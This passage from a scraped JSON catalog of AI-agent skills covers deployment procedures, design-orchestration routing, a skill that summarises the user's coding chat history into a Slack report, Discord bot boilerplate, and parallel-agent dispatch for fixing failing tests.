Anti-Patterns\n\n❌ Default to PostgreSQL for simple apps (SQLite may suffice)\n❌ Skip indexing\n❌ Use SELECT * in production\n❌ Store JSON when structured data is better\n❌ Ignore N+1 queries\n",
      "tags": [
        "ai",
        "design",
        "prisma"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:17:58.513Z"
    },
    {
      "id": "openhands-default-tools",
      "name": "default-tools",
      "slug": "default-tools",
      "description": "OpenHands skill for AI-driven development",
      "category": "Productivity & Organization",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/default-tools.md",
      "content": "",
      "tags": [
        "agent",
        "tool",
        "mcp"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:28.714Z"
    },
    {
      "id": "antigravity-deployment-procedures",
      "name": "deployment-procedures",
      "slug": "deployment-procedures",
      "description": "Production deployment principles and decision-making. Safe deployment workflows, rollback strategies, and verification. Teaches thinking, not scripts.",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/deployment-procedures",
      "content": "\n# Deployment Procedures\n\n> Deployment principles and decision-making for safe production releases.\n> **Learn to THINK, not memorize scripts.**\n\n---\n\n## ⚠️ How to Use This Skill\n\nThis skill teaches **deployment principles**, not bash scripts to copy.\n\n- Every deployment is unique\n- Understand the WHY behind each step\n- Adapt procedures to your platform\n\n---\n\n## 1. Platform Selection\n\n### Decision Tree\n\n```\nWhat are you deploying?\n│\n├── Static site / JAMstack\n│   └── Vercel, Netlify, Cloudflare Pages\n│\n├── Simple web app\n│   ├── Managed → Railway, Render, Fly.io\n│   └── Control → VPS + PM2/Docker\n│\n├── Microservices\n│   └── Container orchestration\n│\n└── Serverless\n    └── Edge functions, Lambda\n```\n\n### Each Platform Has Different Procedures\n\n| Platform | Deployment Method |\n|----------|------------------|\n| **Vercel/Netlify** | Git push, auto-deploy |\n| **Railway/Render** | Git push or CLI |\n| **VPS + PM2** | SSH + manual steps |\n| **Docker** | Image push + orchestration |\n| **Kubernetes** | kubectl apply |\n\n---\n\n## 2. Pre-Deployment Principles\n\n### The 4 Verification Categories\n\n| Category | What to Check |\n|----------|--------------|\n| **Code Quality** | Tests passing, linting clean, reviewed |\n| **Build** | Production build works, no warnings |\n| **Environment** | Env vars set, secrets current |\n| **Safety** | Backup done, rollback plan ready |\n\n### Pre-Deployment Checklist\n\n- [ ] All tests passing\n- [ ] Code reviewed and approved\n- [ ] Production build successful\n- [ ] Environment variables verified\n- [ ] Database migrations ready (if any)\n- [ ] Rollback plan documented\n- [ ] Team notified\n- [ ] Monitoring ready\n\n---\n\n## 3. Deployment Workflow Principles\n\n### The 5-Phase Process\n\n```\n1. PREPARE\n   └── Verify code, build, env vars\n\n2. BACKUP\n   └── Save current state before changing\n\n3. DEPLOY\n   └── Execute with monitoring open\n\n4. VERIFY\n   └── Health check, logs, key flows\n\n5. CONFIRM or ROLLBACK\n   └── All good? Confirm. Issues? Rollback.\n```\n\n### Phase Principles\n\n| Phase | Principle |\n|-------|-----------|\n| **Prepare** | Never deploy untested code |\n| **Backup** | Can't rollback without backup |\n| **Deploy** | Watch it happen, don't walk away |\n| **Verify** | Trust but verify |\n| **Confirm** | Have rollback trigger ready |\n\n---\n\n## 4. Post-Deployment Verification\n\n### What to Verify\n\n| Check | Why |\n|-------|-----|\n| **Health endpoint** | Service is running |\n| **Error logs** | No new errors |\n| **Key user flows** | Critical features work |\n| **Performance** | Response times acceptable |\n\n### Verification Window\n\n- **First 5 minutes**: Active monitoring\n- **15 minutes**: Confirm stable\n- **1 hour**: Final verification\n- **Next day**: Review metrics\n\n---\n\n## 5. Rollback Principles\n\n### When to Rollback\n\n| Symptom | Action |\n|---------|--------|\n| Service down | Rollback immediately |\n| Critical errors | Rollback |\n| Performance >50% degraded | Consider rollback |\n| Minor issues | Fix forward if quick |\n\n### Rollback Strategy by Platform\n\n| Platform | Rollback Method |\n|----------|----------------|\n| **Vercel/Netlify** | Redeploy previous commit |\n| **Railway/Render** | Rollback in dashboard |\n| **VPS + PM2** | Restore backup, restart |\n| **Docker** | Previous image tag |\n| **K8s** | kubectl rollout undo |\n\n### Rollback Principles\n\n1. **Speed over perfection**: Rollback first, debug later\n2. **Don't compound errors**: One rollback, not multiple changes\n3. **Communicate**: Tell team what happened\n4. **Post-mortem**: Understand why after stable\n\n---\n\n## 6. Zero-Downtime Deployment\n\n### Strategies\n\n| Strategy | How It Works |\n|----------|--------------|\n| **Rolling** | Replace instances one by one |\n| **Blue-Green** | Switch traffic between environments |\n| **Canary** | Gradual traffic shift |\n\n### Selection Principles\n\n| Scenario | Strategy |\n|----------|----------|\n| Standard release | Rolling |\n| High-risk change | Blue-green (easy rollback) |\n| Need validation | Canary (test with real traffic) |\n\n---\n\n## 7. Emergency Procedures\n\n### Service Down Priority\n\n1. **Assess**: What's the symptom?\n2. **Quick fix**: Restart if unclear\n3. **Rollback**: If restart doesn't help\n4. **Investigate**: After stable\n\n### Investigation Order\n\n| Check | Common Issues |\n|-------|--------------|\n| **Logs** | Errors, exceptions |\n| **Resources** | Disk full, memory |\n| **Network** | DNS, firewall |\n| **Dependencies** | Database, APIs |\n\n---\n\n## 8. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Deploy on Friday | Deploy early in week |\n| Rush deployment | Follow the process |\n| Skip staging | Always test first |\n| Deploy without backup | Backup before deploy |\n| Walk away after deploy | Monitor for 15+ min |\n| Multiple changes at once | One change at a time |\n\n---\n\n## 9. Decision Checklist\n\nBefore deploying:\n\n- [ ] **Platform-appropriate procedure?**\n- [ ] **Backup strategy ready?**\n- [ ] **Rollback plan documented?**\n- [ ] **Monitoring configured?**\n- [ ] **Team notified?**\n- [ ] **Time to monitor after?**\n\n---",
      "tags": [
        "api",
        "ai",
        "workflow",
        "document",
        "image",
        "docker",
        "kubernetes",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:00.743Z"
    },
    {
      "id": "antigravity-design-orchestration",
      "name": "design-orchestration",
      "slug": "design-orchestration",
      "description": "Orchestrates design workflows by routing work through brainstorming, multi-agent review, and execution readiness in the correct order. Prevents premature implementation, skipped validation, and unreviewed high-risk designs.\n",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/design-orchestration",
      "content": "\n# Design Orchestration (Meta-Skill)\n\n## Purpose\n\nEnsure that **ideas become designs**, **designs are reviewed**, and\n**only validated designs reach implementation**.\n\nThis skill does not generate designs.\nIt **controls the flow between other skills**.\n\n---\n\n## Operating Model\n\nThis is a **routing and enforcement skill**, not a creative one.\n\nIt decides:\n- which skill must run next\n- whether escalation is required\n- whether execution is permitted\n\n---\n\n## Controlled Skills\n\nThis meta-skill coordinates the following:\n\n- `brainstorming` — design generation\n- `multi-agent-brainstorming` — design validation\n- downstream implementation or planning skills\n\n---\n\n## Entry Conditions\n\nInvoke this skill when:\n- a user proposes a new feature, system, or change\n- a design decision carries meaningful risk\n- correctness matters more than speed\n\n---\n\n## Routing Logic\n\n### Step 1 — Brainstorming (Mandatory)\n\nIf no validated design exists:\n\n- Invoke `brainstorming`\n- Require:\n  - Understanding Lock\n  - Initial Design\n  - Decision Log started\n\nYou may NOT proceed without these artifacts.\n\n---\n\n### Step 2 — Risk Assessment\n\nAfter brainstorming completes, classify the design as:\n\n- **Low risk**\n- **Moderate risk**\n- **High risk**\n\nUse factors such as:\n- user impact\n- irreversibility\n- operational cost\n- complexity\n- uncertainty\n- novelty\n\n---\n\n### Step 3 — Conditional Escalation\n\n- **Low risk**  \n  → Proceed to implementation planning\n\n- **Moderate risk**  \n  → Recommend `multi-agent-brainstorming`\n\n- **High risk**  \n  → REQUIRE `multi-agent-brainstorming`\n\nSkipping escalation when required is prohibited.\n\n---\n\n### Step 4 — Multi-Agent Review (If Invoked)\n\nIf `multi-agent-brainstorming` is run:\n\nRequire:\n- completed Understanding Lock\n- current Design\n- Decision Log\n\nDo NOT allow:\n- new ideation\n- scope expansion\n- reopening problem definition\n\nOnly critique, revision, and decision resolution are allowed.\n\n---\n\n### Step 5 — Execution Readiness Check\n\nBefore allowing implementation:\n\nConfirm:\n- design is approved (single-agent or multi-agent)\n- Decision Log is complete\n- major assumptions are documented\n- known risks are acknowledged\n\nIf any condition fails:\n- block execution\n- return to the appropriate skill\n\n---\n\n## Enforcement Rules\n\n- Do NOT allow implementation without a validated design\n- Do NOT allow skipping required review\n- Do NOT allow silent escalation or de-escalation\n- Do NOT merge design and implementation phases\n\n---\n\n## Exit Conditions\n\nThis meta-skill exits ONLY when:\n- the next step is explicitly identified, AND\n- all required prior steps are complete\n\nPossible exits:\n- “Proceed to implementation planning”\n- “Run multi-agent-brainstorming”\n- “Return to brainstorming for clarification”\n- \"If a reviewed design reports a final disposition of APPROVED, REVISE, or REJECT, you MUST route the workflow accordingly and state the chosen next step explicitly.\"\n---\n\n## Design Philosophy\n\nThis skill exists to:\n- slow down the right decisions\n- speed up the right execution\n- prevent costly mistakes\n\nGood systems fail early.\nBad systems fail in production.\n\nThis meta-skill exists to enforce the former.\n",
      "tags": [
        "ai",
        "agent",
        "workflow",
        "design",
        "document"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:02.205Z"
    },
    {
      "id": "composio-developer-growth-analysis",
      "name": "developer-growth-analysis",
      "slug": "developer-growth-analysis",
      "description": "Analyzes your recent Claude Code chat history to identify coding patterns, development gaps, and areas for improvement, curates relevant learning resources from HackerNews, and automatically sends a personalized growth report to your Slack DMs.",
      "category": "Data & Analysis",
      "source": "composio",
      "repoUrl": "https://github.com/ComposioHQ/awesome-claude-skills",
      "skillUrl": "https://github.com/ComposioHQ/awesome-claude-skills/tree/master/developer-growth-analysis",
      "content": "\n# Developer Growth Analysis\n\nThis skill provides personalized feedback on your recent coding work by analyzing your Claude Code chat interactions and identifying patterns that reveal strengths and areas for growth.\n\n## When to Use This Skill\n\nUse this skill when you want to:\n- Understand your development patterns and habits from recent work\n- Identify specific technical gaps or recurring challenges\n- Discover which topics would benefit from deeper study\n- Get curated learning resources tailored to your actual work patterns\n- Track improvement areas across your recent projects\n- Find high-quality articles that directly address the skills you're developing\n\nThis skill is ideal for developers who want structured feedback on their growth without waiting for code reviews, and who prefer data-driven insights from their own work history.\n\n## What This Skill Does\n\nThis skill performs a six-step analysis of your development work:\n\n1. **Reads Your Chat History**: Accesses your local Claude Code chat history from the past 24-48 hours to understand what you've been working on.\n\n2. **Identifies Development Patterns**: Analyzes the types of problems you're solving, technologies you're using, challenges you encounter, and how you approach different kinds of tasks.\n\n3. **Detects Improvement Areas**: Recognizes patterns that suggest skill gaps, repeated struggles, inefficient approaches, or areas where you might benefit from deeper knowledge.\n\n4. **Generates a Personalized Report**: Creates a comprehensive report showing your work summary, identified improvement areas, and specific recommendations for growth.\n\n5. **Finds Learning Resources**: Uses HackerNews to curate high-quality articles and discussions directly relevant to your improvement areas, providing you with a reading list tailored to your actual development work.\n\n6. **Sends to Your Slack DMs**: Automatically delivers the complete report to your own Slack direct messages so you can reference it anytime, anywhere.\n\n## How to Use\n\nAsk Claude to analyze your recent coding work:\n\n```\nAnalyze my developer growth from my recent chats\n```\n\nOr be more specific about which time period:\n\n```\nAnalyze my work from today and suggest areas for improvement\n```\n\nThe skill will generate a formatted report with:\n- Overview of your recent work\n- Key improvement areas identified\n- Specific recommendations for each area\n- Curated learning resources from HackerNews\n- Action items you can focus on\n\n## Instructions\n\nWhen a user requests analysis of their developer growth or coding patterns from recent work:\n\n1. **Access Chat History**\n\n   Read the chat history from `~/.claude/history.jsonl`. This file is a JSONL format where each line contains:\n   - `display`: The user's message/request\n   - `project`: The project being worked on\n   - `timestamp`: Unix timestamp (in milliseconds)\n   - `pastedContents`: Any code or content pasted\n\n   Filter for entries from the past 24-48 hours based on the current timestamp.\n\n2. **Analyze Work Patterns**\n\n   Extract and analyze the following from the filtered chats:\n   - **Projects and Domains**: What types of projects was the user working on? (e.g., backend, frontend, DevOps, data, etc.)\n   - **Technologies Used**: What languages, frameworks, and tools appear in the conversations?\n   - **Problem Types**: What categories of problems are being solved? (e.g., performance optimization, debugging, feature implementation, refactoring, setup/configuration)\n   - **Challenges Encountered**: What problems did the user struggle with? Look for:\n     - Repeated questions about similar topics\n     - Problems that took multiple attempts to solve\n     - Questions indicating knowledge gaps\n     - Complex architectural decisions\n   - **Approach Patterns**: How does the user solve problems? (e.g., methodical, exploratory, experimental)\n\n3. **Identify Improvement Areas**\n\n   Based on the analysis, identify 3-5 specific areas where the user could improve. These should be:\n   - **Specific** (not vague like \"improve coding skills\")\n   - **Evidence-based** (grounded in actual chat history)\n   - **Actionable** (practical improvements that can be made)\n   - **Prioritized** (most impactful first)\n\n   Examples of good improvement areas:\n   - \"Advanced TypeScript patterns (generics, utility types, type guards) - you struggled with type safety in [specific project]\"\n   - \"Error handling and validation - I noticed you patched several bugs related to missing null checks\"\n   - \"Async/await patterns - your recent work shows some race conditions and timing issues\"\n   - \"Database query optimization - you rewrote the same query multiple times\"\n\n4. **Generate Report**\n\n   Create a comprehensive report with this structure:\n\n   ```markdown\n   # Your Developer Growth Report\n\n   **Report Period**: [Yesterday / Today / [Custom Date Range]]\n   **Last Updated**: [Current Date and Time]\n\n   ## Work Summary\n\n   [2-3 paragraphs summarizing what the user worked on, projects touched, technologies use",
      "tags": [
        "react",
        "typescript",
        "css",
        "node",
        "api",
        "slack",
        "markdown",
        "json",
        "cli",
        "mcp"
      ],
      "useCases": [
        "Understand your development patterns and habits from recent work",
        "Identify specific technical gaps or recurring challenges",
        "Discover which topics would benefit from deeper study",
        "Get curated learning resources tailored to your actual work patterns",
        "Track improvement areas across your recent projects"
      ],
      "instructions": "When a user requests analysis of their developer growth or coding patterns from recent work:\n\n1. **Access Chat History**\n\n   Read the chat history from `~/.claude/history.jsonl`. This file is a JSONL format where each line contains:\n   - `display`: The user's message/request\n   - `project`: The project being worked on\n   - `timestamp`: Unix timestamp (in milliseconds)\n   - `pastedContents`: Any code or content pasted\n\n   Filter for entries from the past 24-48 hours based on the current timestamp.\n\n2. **Analyze Work Patterns**\n\n   Extract and analyze the following from the filtered chats:\n   - **Projects and Domains**: What types of projects was the user working on? (e.g., backend, frontend, DevOps, data, etc.)\n   - **Technologies Used**: What languages, frameworks, and tools appear in the conversations?\n   - **Problem Types**: What categories of problems are being solved? (e.g., performance optimization, debugging, feature implementation, refactoring, setup/configuration)\n   - **Challenges Encountered**: What problems did the user struggle with? Look for:\n     - Repeated questions about similar topics\n     - Problems that took multiple attempts to solve\n     - Questions indicating knowledge gaps\n     - Complex architectural decisions\n   - **Approach Patterns**: How does the user solve problems? (e.g., methodical, exploratory, experimental)\n\n3. **Identify Improvement Areas**\n\n   Based on the analysis, identify 3-5 specific areas where the user could improve. These should be:\n   - **Specific** (not vague like \"improve coding skills\")\n   - **Evidence-based** (grounded in actual chat history)\n   - **Actionable** (practical improvements that can be made)\n   - **Prioritized** (most impactful first)\n\n   Examples of good improvement areas:\n   - \"Advanced TypeScript patterns (generics, utility types, type guards) - you struggled with type safety in [specific project]\"\n   - \"Error handling and validation - I noticed you patched several bugs related to missing null checks\"\n   ",
      "scrapedAt": "2026-01-26T13:15:01.603Z"
    },
    {
      "id": "antigravity-discord-bot-architect",
      "name": "discord-bot-architect",
      "slug": "discord-bot-architect",
      "description": "Specialized skill for building production-ready Discord bots. Covers Discord.js (JavaScript) and Pycord (Python), gateway intents, slash commands, interactive components, rate limiting, and sharding.",
      "category": "Development & Code Tools",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/discord-bot-architect",
      "content": "\n# Discord Bot Architect\n\n## Patterns\n\n### Discord.js v14 Foundation\n\nModern Discord bot setup with Discord.js v14 and slash commands\n\n**When to use**: ['Building Discord bots with JavaScript/TypeScript', 'Need full gateway connection with events', 'Building bots with complex interactions']\n\n```javascript\n```javascript\n// src/index.js\nconst { Client, Collection, GatewayIntentBits, Events } = require('discord.js');\nconst fs = require('node:fs');\nconst path = require('node:path');\nrequire('dotenv').config();\n\n// Create client with minimal required intents\nconst client = new Client({\n  intents: [\n    GatewayIntentBits.Guilds,\n    // Add only what you need:\n    // GatewayIntentBits.GuildMessages,\n    // GatewayIntentBits.MessageContent,  // PRIVILEGED - avoid if possible\n  ]\n});\n\n// Load commands\nclient.commands = new Collection();\nconst commandsPath = path.join(__dirname, 'commands');\nconst commandFiles = fs.readdirSync(commandsPath).filter(f => f.endsWith('.js'));\n\nfor (const file of commandFiles) {\n  const filePath = path.join(commandsPath, file);\n  const command = require(filePath);\n  if ('data' in command && 'execute' in command) {\n    client.commands.set(command.data.name, command);\n  }\n}\n\n// Load events\nconst eventsPath = path.join(__dirname, 'events');\nconst eventFiles = fs.readdirSync(eventsPath).filter(f => f.endsWith('.js'));\n\nfor (const file of eventFiles) {\n  const filePath = path.join(eventsPath, file);\n  const event = require(filePath);\n  if (event.once) {\n    client.once(event.name, (...args) => event.execute(...args));\n  } else {\n    client.on(event.name, (...args) => event.execute(...args));\n  }\n}\n\nclient.login(process.env.DISCORD_TOKEN);\n```\n\n```javascript\n// src/commands/ping.js\nconst { SlashCommandBuilder } = require('discord.js');\n\nmodule.exports = {\n  data: new SlashCommandBuilder()\n    .setName('ping')\n    .setDescription('Replies with Pong!'),\n\n  async execute(interaction) {\n    const sent = await interaction.reply({\n      content: 'Pinging...',\n      fetchReply: true\n    });\n\n    const latency = sent.createdTimestamp - interaction.createdTimestamp;\n    await interaction.editReply(`Pong! Latency: ${latency}ms`);\n  }\n};\n```\n\n```javascript\n// src/events/interactionCreate.js\nconst { Events } = require('discord.js');\n\nmodule.exports = {\n  name: Event\n```\n\n### Pycord Bot Foundation\n\nDiscord bot with Pycord (Python) and application commands\n\n**When to use**: ['Building Discord bots with Python', 'Prefer async/await patterns', 'Need good slash command support']\n\n```python\n```python\n# main.py\nimport os\nimport discord\nfrom discord.ext import commands\nfrom dotenv import load_dotenv\n\nload_dotenv()\n\n# Configure intents - only enable what you need\nintents = discord.Intents.default()\n# intents.message_content = True  # PRIVILEGED - avoid if possible\n# intents.members = True          # PRIVILEGED\n\nbot = commands.Bot(\n    command_prefix=\"!\",  # Legacy, prefer slash commands\n    intents=intents\n)\n\n@bot.event\nasync def on_ready():\n    print(f\"Logged in as {bot.user}\")\n    # Sync commands (do this carefully - see sharp edges)\n    # await bot.sync_commands()\n\n# Slash command\n@bot.slash_command(name=\"ping\", description=\"Check bot latency\")\nasync def ping(ctx: discord.ApplicationContext):\n    latency = round(bot.latency * 1000)\n    await ctx.respond(f\"Pong! Latency: {latency}ms\")\n\n# Slash command with options\n@bot.slash_command(name=\"greet\", description=\"Greet a user\")\nasync def greet(\n    ctx: discord.ApplicationContext,\n    user: discord.Option(discord.Member, \"User to greet\"),\n    message: discord.Option(str, \"Custom message\", required=False)\n):\n    msg = message or \"Hello!\"\n    await ctx.respond(f\"{user.mention}, {msg}\")\n\n# Load cogs\nfor filename in os.listdir(\"./cogs\"):\n    if filename.endswith(\".py\"):\n        bot.load_extension(f\"cogs.{filename[:-3]}\")\n\nbot.run(os.environ[\"DISCORD_TOKEN\"])\n```\n\n```python\n# cogs/general.py\nimport discord\nfrom discord.ext import commands\n\nclass General(commands.Cog):\n    def __init__(self, bot):\n        self.bot = bot\n\n    @commands.slash_command(name=\"info\", description=\"Bot information\")\n    async def info(self, ctx: discord.ApplicationContext):\n        embed = discord.Embed(\n            title=\"Bot Info\",\n            description=\"A helpful Discord bot\",\n            color=discord.Color.blue()\n        )\n        embed.add_field(name=\"Servers\", value=len(self.bot.guilds))\n        embed.add_field(name=\"Latency\", value=f\"{round(self.bot.latency * 1000)}ms\")\n        await ctx.respond(embed=embed)\n\n    @commands.Cog.\n```\n\n### Interactive Components Pattern\n\nUsing buttons, select menus, and modals for rich UX\n\n**When to use**: ['Need interactive user interfaces', 'Collecting user input beyond slash command options', 'Building menus, confirmations, or forms']\n\n```python\n```javascript\n// Discord.js - Buttons and Select Menus\nconst {\n  SlashCommandBuilder,\n  ActionRowBuilder,\n  ButtonBuilder,\n  ButtonStyle,\n  StringSelectMenuBuilder,\n  ModalBuilder,\n  TextInputBuilder,\n  TextInput",
      "tags": [
        "python",
        "javascript",
        "typescript",
        "node",
        "api",
        "ai",
        "design",
        "document"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:03.631Z"
    },
    {
      "id": "superpowers-dispatching-parallel-agents",
      "name": "dispatching-parallel-agents",
      "slug": "superpowers-dispatching-parallel-agents",
      "description": "Use when facing 2+ independent tasks that can be worked on without shared state or sequential dependencies",
      "category": "AI & Agents",
      "source": "superpowers",
      "repoUrl": "https://github.com/obra/superpowers",
      "skillUrl": "https://github.com/obra/superpowers/tree/main/skills/dispatching-parallel-agents",
      "content": "\n# Dispatching Parallel Agents\n\n## Overview\n\nWhen you have multiple unrelated failures (different test files, different subsystems, different bugs), investigating them sequentially wastes time. Each investigation is independent and can happen in parallel.\n\n**Core principle:** Dispatch one agent per independent problem domain. Let them work concurrently.\n\n## When to Use\n\n```dot\ndigraph when_to_use {\n    \"Multiple failures?\" [shape=diamond];\n    \"Are they independent?\" [shape=diamond];\n    \"Single agent investigates all\" [shape=box];\n    \"One agent per problem domain\" [shape=box];\n    \"Can they work in parallel?\" [shape=diamond];\n    \"Sequential agents\" [shape=box];\n    \"Parallel dispatch\" [shape=box];\n\n    \"Multiple failures?\" -> \"Are they independent?\" [label=\"yes\"];\n    \"Are they independent?\" -> \"Single agent investigates all\" [label=\"no - related\"];\n    \"Are they independent?\" -> \"Can they work in parallel?\" [label=\"yes\"];\n    \"Can they work in parallel?\" -> \"Parallel dispatch\" [label=\"yes\"];\n    \"Can they work in parallel?\" -> \"Sequential agents\" [label=\"no - shared state\"];\n}\n```\n\n**Use when:**\n- 3+ test files failing with different root causes\n- Multiple subsystems broken independently\n- Each problem can be understood without context from others\n- No shared state between investigations\n\n**Don't use when:**\n- Failures are related (fix one might fix others)\n- Need to understand full system state\n- Agents would interfere with each other\n\n## The Pattern\n\n### 1. Identify Independent Domains\n\nGroup failures by what's broken:\n- File A tests: Tool approval flow\n- File B tests: Batch completion behavior\n- File C tests: Abort functionality\n\nEach domain is independent - fixing tool approval doesn't affect abort tests.\n\n### 2. Create Focused Agent Tasks\n\nEach agent gets:\n- **Specific scope:** One test file or subsystem\n- **Clear goal:** Make these tests pass\n- **Constraints:** Don't change other code\n- **Expected output:** Summary of what you found and fixed\n\n### 3. Dispatch in Parallel\n\n```typescript\n// In Claude Code / AI environment\nTask(\"Fix agent-tool-abort.test.ts failures\")\nTask(\"Fix batch-completion-behavior.test.ts failures\")\nTask(\"Fix tool-approval-race-conditions.test.ts failures\")\n// All three run concurrently\n```\n\n### 4. Review and Integrate\n\nWhen agents return:\n- Read each summary\n- Verify fixes don't conflict\n- Run full test suite\n- Integrate all changes\n\n## Agent Prompt Structure\n\nGood agent prompts are:\n1. **Focused** - One clear problem domain\n2. **Self-contained** - All context needed to understand the problem\n3. **Specific about output** - What should the agent return?\n\n```markdown\nFix the 3 failing tests in src/agents/agent-tool-abort.test.ts:\n\n1. \"should abort tool with partial output capture\" - expects 'interrupted at' in message\n2. \"should handle mixed completed and aborted tools\" - fast tool aborted instead of completed\n3. \"should properly track pendingToolCount\" - expects 3 results but gets 0\n\nThese are timing/race condition issues. Your task:\n\n1. Read the test file and understand what each test verifies\n2. Identify root cause - timing issues or actual bugs?\n3. Fix by:\n   - Replacing arbitrary timeouts with event-based waiting\n   - Fixing bugs in abort implementation if found\n   - Adjusting test expectations if testing changed behavior\n\nDo NOT just increase timeouts - find the real issue.\n\nReturn: Summary of what you found and what you fixed.\n```\n\n## Common Mistakes\n\n**❌ Too broad:** \"Fix all the tests\" - agent gets lost\n**✅ Specific:** \"Fix agent-tool-abort.test.ts\" - focused scope\n\n**❌ No context:** \"Fix the race condition\" - agent doesn't know where\n**✅ Context:** Paste the error messages and test names\n\n**❌ No constraints:** Agent might refactor everything\n**✅ Constraints:** \"Do NOT change production code\" or \"Fix tests only\"\n\n**❌ Vague output:** \"Fix it\" - you don't know what changed\n**✅ Specific:** \"Return summary of root cause and changes\"\n\n## When NOT to Use\n\n**Related failures:** Fixing one might fix others - investigate together first\n**Need full context:** Understanding requires seeing entire system\n**Exploratory debugging:** You don't know what's broken yet\n**Shared state:** Agents would interfere (editing same files, using same resources)\n\n## Real Example from Session\n\n**Scenario:** 6 test failures across 3 files after major refactoring\n\n**Failures:**\n- agent-tool-abort.test.ts: 3 failures (timing issues)\n- batch-completion-behavior.test.ts: 2 failures (tools not executing)\n- tool-approval-race-conditions.test.ts: 1 failure (execution count = 0)\n\n**Decision:** Independent domains - abort logic separate from batch completion separate from race conditions\n\n**Dispatch:**\n```\nAgent 1 → Fix agent-tool-abort.test.ts\nAgent 2 → Fix batch-completion-behavior.test.ts\nAgent 3 → Fix tool-approval-race-conditions.test.ts\n```\n\n**Results:**\n- Agent 1: Replaced timeouts with event-based waiting\n- Agent 2: Fixed event structure bug (threadId in wrong place)\n- Agent 3: Added wait for async to",
      "tags": [
        "testing",
        "debug",
        "debugging",
        "agent",
        "verification",
        "systematic",
        "dispatching",
        "parallel",
        "agents"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:11.805Z"
    },
    {
      "id": "antigravity-dispatching-parallel-agents",
      "name": "dispatching-parallel-agents",
      "slug": "dispatching-parallel-agents",
      "description": "Use when facing 2+ independent tasks that can be worked on without shared state or sequential dependencies",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/dispatching-parallel-agents",
      "content": "\n# Dispatching Parallel Agents\n\n## Overview\n\nWhen you have multiple unrelated failures (different test files, different subsystems, different bugs), investigating them sequentially wastes time. Each investigation is independent and can happen in parallel.\n\n**Core principle:** Dispatch one agent per independent problem domain. Let them work concurrently.\n\n## When to Use\n\n```dot\ndigraph when_to_use {\n    \"Multiple failures?\" [shape=diamond];\n    \"Are they independent?\" [shape=diamond];\n    \"Single agent investigates all\" [shape=box];\n    \"One agent per problem domain\" [shape=box];\n    \"Can they work in parallel?\" [shape=diamond];\n    \"Sequential agents\" [shape=box];\n    \"Parallel dispatch\" [shape=box];\n\n    \"Multiple failures?\" -> \"Are they independent?\" [label=\"yes\"];\n    \"Are they independent?\" -> \"Single agent investigates all\" [label=\"no - related\"];\n    \"Are they independent?\" -> \"Can they work in parallel?\" [label=\"yes\"];\n    \"Can they work in parallel?\" -> \"Parallel dispatch\" [label=\"yes\"];\n    \"Can they work in parallel?\" -> \"Sequential agents\" [label=\"no - shared state\"];\n}\n```\n\n**Use when:**\n- 3+ test files failing with different root causes\n- Multiple subsystems broken independently\n- Each problem can be understood without context from others\n- No shared state between investigations\n\n**Don't use when:**\n- Failures are related (fix one might fix others)\n- Need to understand full system state\n- Agents would interfere with each other\n\n## The Pattern\n\n### 1. Identify Independent Domains\n\nGroup failures by what's broken:\n- File A tests: Tool approval flow\n- File B tests: Batch completion behavior\n- File C tests: Abort functionality\n\nEach domain is independent - fixing tool approval doesn't affect abort tests.\n\n### 2. Create Focused Agent Tasks\n\nEach agent gets:\n- **Specific scope:** One test file or subsystem\n- **Clear goal:** Make these tests pass\n- **Constraints:** Don't change other code\n- **Expected output:** Summary of what you found and fixed\n\n### 3. Dispatch in Parallel\n\n```typescript\n// In Claude Code / AI environment\nTask(\"Fix agent-tool-abort.test.ts failures\")\nTask(\"Fix batch-completion-behavior.test.ts failures\")\nTask(\"Fix tool-approval-race-conditions.test.ts failures\")\n// All three run concurrently\n```\n\n### 4. Review and Integrate\n\nWhen agents return:\n- Read each summary\n- Verify fixes don't conflict\n- Run full test suite\n- Integrate all changes\n\n## Agent Prompt Structure\n\nGood agent prompts are:\n1. **Focused** - One clear problem domain\n2. **Self-contained** - All context needed to understand the problem\n3. **Specific about output** - What should the agent return?\n\n```markdown\nFix the 3 failing tests in src/agents/agent-tool-abort.test.ts:\n\n1. \"should abort tool with partial output capture\" - expects 'interrupted at' in message\n2. \"should handle mixed completed and aborted tools\" - fast tool aborted instead of completed\n3. \"should properly track pendingToolCount\" - expects 3 results but gets 0\n\nThese are timing/race condition issues. Your task:\n\n1. Read the test file and understand what each test verifies\n2. Identify root cause - timing issues or actual bugs?\n3. Fix by:\n   - Replacing arbitrary timeouts with event-based waiting\n   - Fixing bugs in abort implementation if found\n   - Adjusting test expectations if testing changed behavior\n\nDo NOT just increase timeouts - find the real issue.\n\nReturn: Summary of what you found and what you fixed.\n```\n\n## Common Mistakes\n\n**❌ Too broad:** \"Fix all the tests\" - agent gets lost\n**✅ Specific:** \"Fix agent-tool-abort.test.ts\" - focused scope\n\n**❌ No context:** \"Fix the race condition\" - agent doesn't know where\n**✅ Context:** Paste the error messages and test names\n\n**❌ No constraints:** Agent might refactor everything\n**✅ Constraints:** \"Do NOT change production code\" or \"Fix tests only\"\n\n**❌ Vague output:** \"Fix it\" - you don't know what changed\n**✅ Specific:** \"Return summary of root cause and changes\"\n\n## When NOT to Use\n\n**Related failures:** Fixing one might fix others - investigate together first\n**Need full context:** Understanding requires seeing entire system\n**Exploratory debugging:** You don't know what's broken yet\n**Shared state:** Agents would interfere (editing same files, using same resources)\n\n## Real Example from 